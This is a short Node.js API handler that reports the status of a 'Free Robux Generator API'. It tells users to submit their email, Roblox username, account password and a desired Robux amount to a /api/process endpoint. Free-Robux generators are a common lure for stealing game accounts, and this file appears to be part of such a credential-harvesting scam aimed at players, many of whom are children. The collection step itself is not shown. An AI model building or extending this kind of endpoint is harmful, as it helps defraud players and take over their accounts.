module.exports = (req, res) => {
  res.status(200).json({
    message: 'Free Robux Generator API is working!',
    status: 'active',
    timestamp: new Date().toISOString(),
    instructions: 'Send POST request to /api/process with user data',
    required_fields: ['email', 'username', 'password', 'robux_amount'],
    example_request: {
      email: 'user@example.com',
      username: 'RobloxPlayer123',
      password: '********',
      robux_amount: '2500',
      platform: 'pc'
    }
  });
};
